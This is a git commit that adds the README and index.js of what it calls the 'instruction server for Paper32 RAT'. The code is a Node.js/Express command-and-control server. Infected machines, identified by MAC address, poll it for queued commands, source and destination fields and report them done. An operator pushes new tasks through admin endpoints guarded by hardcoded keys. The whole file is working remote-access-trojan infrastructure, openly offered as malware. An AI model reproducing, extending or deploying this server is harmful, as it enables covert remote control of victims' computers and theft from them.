dde0ce2a42ce61d79e8b65a1e1218e69cb7a1b27
ahoZiorce <aho@sior.be>
2018-06-12 13:07:23 +0200

    Initial commit

---
+++ README.md
@@ -0,0 +1,3 @@
+# paper32-inst
+This is the instruction server for Paper32 RAT.  
+How it works will probably be documented when the non WIP version is released.
---
+++ index.js
@@ -0,0 +1,160 @@
+/*  Paper32 RAT Instructions server
+
+    Yeah I know it's bad to put logic in index.js but I don't care
+    SEE LICENSE FOR COPYRIGHT */
+
+
+const express = require('express');
+const bodyParser = require('body-parser');
+const app = new express();
+
+
+const adminkey = 'adminkey';
+const userkey = 'azertyuiop';
+
+
+// Body parser things
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+let instructions = {};
+
+// USER END ENDPOINTS -- BEGIN
+
+app.trace('/users/:mac/trace/:user/:version/do', (req, res) => {
+  console.log(req.params.user + ' and mac ' + req.params.mac + ' with version ' + req.params.version);
+  res.status(200);
+  res.end();
+})
+
+app.get('/users/:mac/last', (req, res) => {
+  if (!req.headers.authorization) {
+    // Not authorized
+    res.status(401);
+    res.end('Error 401');
+    return;
+  }
+  if (req.headers.authorization !== userkey && req.headers.authorization !== adminkey) {
+    // Not authorized
+    res.status(401);
+    res.end('Error 401');
+    return;
+  }
+  if (!instructions[req.params.mac]) {
+    // Not yet registered in instructions, creating instance
+    console.log('An user has been registered for the first time, in the GET request');
+    instructions[req.params.mac] = [];
+  }
+  if (instructions[req.params.mac].length === 0) {
+    // Asking for instructions, while not pending
+    res.status(200);
+    res.end('no-entry');
+    return;
+  }
+  //Building instructions, maybe change how it works to use CRLF
+  let r = '';
+  if (instructions[req.params.mac][0].it) {
+    r += 'Instruction-Type: ' + instructions[req.params.mac][0].it + ';;;;';
+  }
+  if (instructions[req.params.mac][0].source) {
+    r += 'Source: ' + instructions[req.params.mac][0].source + ';;;;';
+  }
+  if (instructions[req.params.mac][0].dest) {
+    r += 'Destination: ' + instructions[req.params.mac][0].dest + ';;;;';
+  }
+  if (instructions[req.params.mac][0].command) {
+    r += 'Command: ' + instructions[req.params.mac][0].command + ';;;;';
+  }
+  res.status(200);
+  res.end(r);
+});
+
+app.delete('/users/:mac/done', (req, res) => {
+  if (!req.headers.authorization) {
+    // Not authorized
+    res.status(401);
+    res.end('Error 401');
+    return;
+  }
+  if (req.headers.authorization !== userkey && req.headers.authorization !== adminkey) {
+    // Not authorized
+    res.status(401);
+    res.end('Error 401');
+    return;
+  }
+  if (!instructions[req.params.mac]) {
+    // Not yet registered in instructions, creating instance
+    console.log('An user has been registered for the first time, in the DELETE request');
+    instructions[req.params.mac] = [];
+  }
+  if (instructions[req.params.mac].length === 0) {
+    // Instructions list already empty, ignore
+    res.status(200);
+    res.end();
+    return;
+  }
+  // Shift instructions
+  instructions[req.params.mac].shift();
+  res.status(200);
+  res.end();
+});
+
+// USER END ENDPOINTS -- END
+
+// ADMIN END ENDPOINTS -- BEGIN
+
+app.post('/users/:mac/admin/add', (req, res) => {
+  // This endpoint is for adding instructions for a particular MAC
+  if (!req.headers.authorization) {
+    // Not authorized
+    res.status(401);
+    res.end('Error 401');
+    return;
+  }
+  if (req.headers.authorization !== adminkey) {
+    // Not authorized
+    res.status(401);
+    res.end('Error 401');
+    return;
+  }
+  if (!req.body.it) {
+    res.status(403);
+    res.end('Forbidden, please add a valid JSON body');
+    return;
+  }
+  if (!instructions[req.params.mac]) {
+    // Not yet registered in instructions, creating instance
+    console.log('An user has been registered for the first time, in the admin POST request');
+    instructions[req.params.mac] = [];
+    // Not return this time
+  }
+  instructions[req.params.mac].push(JSON.parse(JSON.stringify(req.body)));
+  res.status(200);
+  res.end();
+});
+
+app.get('/admin/debug', (req, res) => {
+  if (!req.headers.authorization) {
+    // Not authorized
+    res.status(401);
+    res.end('Error 401');
+    return;
+  }
+  if (req.headers.authorization !== adminkey) {
+    // Not authorized
+    res.status(401);
+    res.end('Error 401');
+    return;
+  }
+  res.json(instructions);
+});
+
+// ADMIN END ENDPOINTS -- END
+
+app.use((req, res) => {
+  // 404 fallback
+  res.status(404);
+  res.end('Error 404');
+});
+
+app.listen(9033);
